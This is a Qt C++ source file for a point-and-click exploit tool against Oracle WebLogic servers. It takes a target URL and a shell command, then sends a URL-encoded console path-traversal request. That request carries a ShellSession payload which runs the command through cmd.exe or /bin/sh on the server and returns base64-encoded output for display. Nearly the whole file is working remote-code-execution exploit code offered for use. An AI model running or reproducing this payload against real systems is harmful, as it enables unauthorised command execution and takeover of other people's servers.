#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QMessageBox>
#include <QNetworkAccessManager>
#include <QString>
#include <QNetworkReply>
#include <QDebug>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_pushButton_clicked()
{
    //QMessageBox::question(this,"Question","Content",QMessageBox::Yes|QMessageBox::No,QMessageBox::Yes);
    const QString target = ui->lineEdit->text().toUtf8()+ "/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField('connectionHandler');field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod('getServletRequest').invoke(obj); String cmd = req.getHeader('cmd');String[] cmds = System.getProperty('os.name').toLowerCase().contains('window') ? new String[]{'cmd.exe', '/c', cmd} : new String[]{'/bin/sh', '-c', cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter('A').next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod('getResponse').invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(new sun.misc.BASE64Encoder().encode(result.getBytes());));res.getServletOutputStream().flush();} currentThread.interrupt();')'";
    if (target == ""){
        QMessageBox::warning(this,"Warning","老哥，你还没有输入目标url地址",QMessageBox::Ok);
    }else{
        QNetworkAccessManager *manager = new QNetworkAccessManager();
//        connect(manager,&QNetworkAccessManager::finished,this,&);
        QNetworkRequest request;
        request.setUrl(QUrl(target));
        qInfo() <<"Result"<<target;
        request.setRawHeader("Content-Type","application/json");
        request.setRawHeader("CMD",ui->lineEdit_2->text().toUtf8());
        qInfo() <<"Result"<<"CMD:"<<ui->lineEdit_2->text().toUtf8();
//        manager->get(request);
        ui->label_4->setText("等待响应....");
        QNetworkReply *reply = manager->get(request);
        connect(manager,&QNetworkAccessManager::finished,this,&MainWindow::finished);

    }


}

void MainWindow::finished(QNetworkReply *reply){
    const int status_code = reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt();
    ui->label_4->setText(" ");
    switch (status_code) {
    case 0:
        QMessageBox::question(this,"Question","无法连接到目标服务器",QMessageBox::Ok);
        break;
    case 200:
        qInfo() << "Finished";
        const QByteArray reply_data = reply->readAll();
        qInfo() << "Reply ALL:"<<reply_data;
        qInfo() << "Decode:"<< QByteArray::fromBase64(reply_data);
        ui->textEdit->setText(QByteArray::fromBase64(reply_data));
        break;
    }

}

